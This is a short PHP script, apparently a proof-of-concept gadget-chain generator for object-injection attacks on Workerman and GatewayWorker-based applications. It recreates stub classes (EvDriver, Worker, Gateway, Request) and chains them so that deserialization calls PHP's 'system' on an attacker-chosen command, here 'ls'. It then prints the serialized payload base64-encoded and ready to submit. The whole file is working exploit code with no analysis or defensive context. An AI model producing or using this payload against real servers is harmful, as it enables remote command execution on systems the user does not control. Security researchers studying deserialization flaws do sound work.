<?php
namespace Revolt\EventLoop\Driver{

        class EvDriver{
                private $events = array();

                public function setEvents($e){
                        $this->events = $e;
                }
        }
}

namespace Workerman{

        class Worker
        {
                public $onWorkerStop = null;

                public function setWS($ws){
                        $this->onWorkerStop = $ws;
                }
        }

}

namespace GatewayWorker{

        class Gateway{
                public $router;
                protected $_workerConnections;
                public $onBusinessWorkerClose;

                public function __construct($router,$_workerConnections,$onBusinessWorkerClose){
                        $this->router = $router;
                        $this->_workerConnections = $_workerConnections;
                        $this->onBusinessWorkerClose = $onBusinessWorkerClose;
                }

                public function onWorkerClose($connection)
    {
        if (isset($connection->key)) {
            unset($this->_workerConnections[$connection->key]);
            if ($this->onBusinessWorkerClose) {
                call_user_func($this->onBusinessWorkerClose, $connection);
            }
        }
    }
        }

}

namespace Workerman\Protocols\Http{
        class Request{
                protected $_buffer = null;
                public function __construct($buffer)
            {
                $this->_buffer = $buffer;
                $this->key = 0;
            }
        }

}

namespace{

        $request = new Workerman\Protocols\Http\Request("ls");//command to execute

        $gt1 = new GatewayWorker\Gateway("",array("nop"),"system");

        $gt2 = new GatewayWorker\Gateway(array($gt1,"onWorkerClose"),$request,"nop");


        $w = new Workerman\Worker();
        $w->setWS([$gt2,"onClientClose"]);

        $e = new Revolt\EventLoop\Driver\EvDriver();
        $e->setEvents(array($w));
		
    	echo base64_encode(serialize($e));

}
